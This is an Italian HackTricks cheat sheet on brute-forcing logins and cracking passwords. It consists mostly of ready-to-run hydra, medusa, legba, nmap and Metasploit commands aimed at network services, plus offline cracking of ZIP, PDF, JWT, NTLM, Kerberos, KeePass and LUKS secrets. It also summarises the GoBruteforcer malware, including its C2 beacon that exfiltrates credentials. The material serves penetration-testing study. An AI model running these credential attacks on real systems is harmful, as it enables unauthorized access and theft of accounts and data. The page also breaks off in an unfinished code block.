# Brute Force - Foglio di riferimento

{{#include ../banners/hacktricks-training.md}}

## Credenziali predefinite

**Cerca su Google** le credenziali predefinite della tecnologia utilizzata oppure **prova questi link**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Crea i tuoi dizionari**

Raccogli più informazioni possibili sul target e genera un dizionario personalizzato. Strumenti utili:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Wordlist basate sui siti web

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

Genera password in base alle informazioni che conosci sulla vittima (nomi, date...)

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Uno strumento per generare wordlist che permette di fornire un insieme di parole e creare più varianti a partire da esse, ottenendo una wordlist unica e ideale da usare con un target specifico.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Wordlist

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## Workflow di un bruteforcer su scala Internet (lezioni dagli scanner basati su Go)

I comportamenti seguenti sono stati osservati nel workflow di scansione del malware GoBruteforcer; i valori esatti dipendono dal campione.<sup>[[1]](#references)</sup>

- Mantiene **pool di worker ottimizzati per l'architettura** (ad esempio, 95 worker concorrenti su `x86_64/arm64`, 85 su `i686`, 35 su `armv5tel` e 50 come valore predefinito sulle altre architetture), controlla i worker attivi ogni secondo e avvia worker sostitutivi quando il numero scende sotto l'obiettivo; ogni worker gestisce al massimo un IP target prima di terminare.
- Genera **indirizzi IPv4 pubblici casuali**, ma scarta gli intervalli palesemente non instradabili e quelli selezionati che gli operatori evitano: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8` con alta presenza di cloud (`3/15/16/56`) e `/8` associati al DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
- **Verifica la porta del servizio** con un timeout breve (~2s) prima di tentare **login in chiaro** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin via HTTP/80) e, se il recupero delle credenziali dal C2 fallisce, usa un **piccolo elenco di credenziali integrato**.
- **Esfiltra i risultati** tramite brevi beacon HTTP GET, come `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (codici dei servizi come `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), riutilizzando uno User-Agent comune dei browser per mimetizzarsi.
- Lo **spray di phpMyAdmin** può provare circa 80 percorsi probabili con `GET /index.php?lang=en`, rilevare marker PMA (tema `pmahomme`/`phpmyadmin.css`/`navigation.php`) e analizzare `codemirror.css?v=X.Y.Z` per scegliere il metodo di autenticazione: le versioni `<4.9` accettano i parametri GET `pma_username`/`pma_password`; le versioni `>=4.9` usano POST con `server=1`, il token CSRF `token` e le stesse credenziali.

## Servizi

In ordine alfabetico per nome del servizio.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM e Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Registro Docker

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP Brute generico

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Modulo POST

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

Per http**s** devi passare da "http-post-form" a "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

Per utilizzare **oracle_login** con **patator** è necessario **installare**:

```bash
pip3 install cx_Oracle --upgrade
```

[Brute force offline dell'hash OracleSQL](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versioni 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Puoi scaricare il pacchetto `.deb` per l'installazione da [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

Per il comportamento del servizio Rexec con autenticazione tramite password, vedi [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

Per l'autenticazione tramite host attendibili e l'accesso al terminale, consulta [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Per l’autenticazione degli host attendibili e i comandi remoti, consulta [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### Chiavi SSH deboli / PRNG prevedibile di Debian

Alcuni sistemi presentano vulnerabilità note nel seed casuale usato per generare materiale crittografico. Questo può ridurre drasticamente lo spazio delle chiavi, consentendo di forzarlo con strumenti come [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sono disponibili anche set pre-generati di chiavi deboli, come [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ e OpenMQ)

Il protocollo testuale STOMP è un protocollo di messaggistica ampiamente utilizzato, che **consente una comunicazione e un'interazione fluide con i più diffusi servizi di accodamento dei messaggi**, come RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Offre un approccio standardizzato ed efficiente per scambiare messaggi ed eseguire diverse operazioni di messaggistica.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## Locale

### Database online per il cracking

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/senza ESS/SSP e con qualsiasi valore di challenge)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash, capture WPA2 e archivi MSOffice, ZIP, PDF...)
- [https://crackstation.net/](https://crackstation.net) (Hash)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hash e hash di file)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hash)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hash)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Dai un'occhiata prima di provare a fare brute force su un Hash.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Known plaintext zip attack

Devi conoscere il **plaintext** (o parte del plaintext) **di un file contenuto** nello zip cifrato. Puoi verificare **i nomi e le dimensioni dei file contenuti** in uno zip cifrato eseguendo: **`7z l encrypted.zip`**\
Scarica [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)dalla pagina delle release.

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### Password proprietaria PDF

Per crackare la password proprietaria di un PDF, consulta questo articolo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Immagine LUKS

#### Metodo 1

Installa: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Metodo 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Un altro tutorial di BF su Luks: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### Chiave privata PGP/GPG

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Usa [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e poi john

### Colonna protetta da password in Open Office

Se hai un file xlsx con una colonna protetta da password, puoi rimuovere la protezione:

- **Caricalo su Google Drive** e la password verrà rimossa automaticamente
- Per **rimuoverla** **manualmente**:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### Certificati PFX

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## Strumenti

**Esempi di hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Wordlist

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Strumenti per la generazione di wordlist**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generatore avanzato di keyboard-walk con caratteri di base, keymap e percorsi configurabili.

```bash
